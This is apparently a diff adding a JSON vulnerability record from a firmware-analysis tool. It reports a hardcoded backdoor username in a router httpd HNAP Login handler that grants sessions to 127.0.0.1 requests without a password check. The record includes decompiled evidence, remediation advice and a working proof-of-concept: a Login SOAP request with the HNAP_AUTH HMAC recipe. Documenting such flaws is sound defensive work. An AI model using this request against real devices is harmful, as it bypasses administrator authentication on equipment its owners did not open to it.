@@ -1,0 +1,30 @@
+{
+  "job_id": "9160aafaa095",
+  "title": "httpd HNAP Login 硬编码后门用户名 0A2326B60AB94BC 免密登录取会话（限 127.0.0.1 来源）",
+  "severity": "medium",
+  "confidence": 0.65,
+  "vuln_class": "认证绕过",
+  "cwe": "CWE-287",
+  "binary_md5": "b18be6d07f1c97903c063686924ed3c7",
+  "binary_path": "firmware/binwalk_extracted/firmware.extracted/0/decrypted.bin.extracted/56CD97/squashfs-root/bin/httpd",
+  "reachability": "static-only",
+  "summary": "httpd 的 HNAP Login 处理器在解析 Username 后先与硬编码字符串 \"0A2326B60AB94BC\" 做 strncmp 前缀比对，命中且请求来源地址为 127.0.0.1 时直接跳到 LABEL_18 生成合法会话（Challenge/PublicKey/会话记录），完全不校验 LoginPassword。因比较长度取 strlen(输入)，输入为该字符串的任意前缀（含空用户名）即成立，属于固件内置的后门账号。",
+  "evidence": [
+    "sub_47B918 @0x47b918 伪C：v19 = strlen(v15); if ( !strncmp(v15, \"0A2326B60AB94BC\", v19) ) { v74[0]=2130706433; if ( dword_4F0154 == 2130706433 ) { read_csman(...,-2147466621,v73,512,4); read_csman(*v21,66437,v75,17,4); goto LABEL_18; } return -401; }",
+    "strncmp 长度由 strlen(攻击者输入) 决定：输入为空串或 \"0A\" 等前缀同样返回 0，即后门匹配面比完整字符串更宽",
+    "来源判定变量 dword_4F0154 由请求结构体填充：sub_470D14 @0x470d14 中 dword_4F0154 = *(_DWORD *)(a1+48)（即请求的客户端地址字段），因此后门仅对本机(127.0.0.1/0x7F000001)来源生效",
+    "LABEL_18 路径使用 csman 65538(0x10002 管理员口令) 与 66435 生成会话：sub_424384(...) 建立会话记录并 strcpy 私钥/口令字段，随后返回成功，无口令校验分支"
+  ],
+  "session_id": "s-mudoe515-e250",
+  "function_name": "sub_47B918",
+  "preconditions": "请求需来自 127.0.0.1（dword_4F0154==0x7F000001）；单独不可从 LAN/WAN 直接利用，但可被设备自身发起的 HTTP 请求（SSRF 类面：如 HNAP 的 fota/远程告警/云功能）或任何本机进程触发，一旦触发即绕过管理员口令获得合法会话。Username 取 \"0A2326B60AB94BC\" 或其任意前缀（含空串）。",
+  "remediation": "删除硬编码用户名字符串与对应免密分支；若为产线/救援用途，改为一次性随机令牌并强制校验口令与来源白名单，且不随量产固件发布。",
+  "poc": "T=秒级时间戳，ACTION='\"http://purenetworks.com/HNAP1/Login\"'，HNAP_AUTH=uppercase(hex_hmac_md5(\"withoutloginkey\", T+ACTION))+\" \"+T；用 curl --interface 127.0.0.1 或从设备本机：POST /HNAP1/ 带 SOAPACTION: \"http://purenetworks.com/HNAP1/Login\"、HNAP_AUTH 头，体为 <?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><Login xmlns=\"http://purenetworks.com/HNAP1/\"><Action>request</Action><Username>0A2326B60AB94BC</Username><LoginPassword></LoginPassword><Captcha></Captcha></Login></soap:Body></soap:Envelope>，响应返回非空 Challenge/Cookie/PublicKey 即证明未校验口令即签发会话。",
+  "call_chain": "HTTP POST /HNAP1/ (SOAPAction: Login, Action=request, Username=0A2326B60AB94BC) → HNAP 动作分发（process_method_hnap，方法名表位于 .rodata 0x4c12b4） → sub_47B918@0x47b918 (Login 处理器) → 硬编码用户名比对命中 + dword_4F0154==127.0.0.1 → LABEL_18 → sub_423D34/sub_424384 生成会话与私钥 → 返回 Cookie/Challenge（免密）",
+  "function_addr": "0x47b918",
+  "id": "F-mudp2qeq-dd51",
+  "status": "draft",
+  "owner": "token-admin",
+  "recorded_at": "2026-09-23T06:00:58Z",
+  "history": []
+}
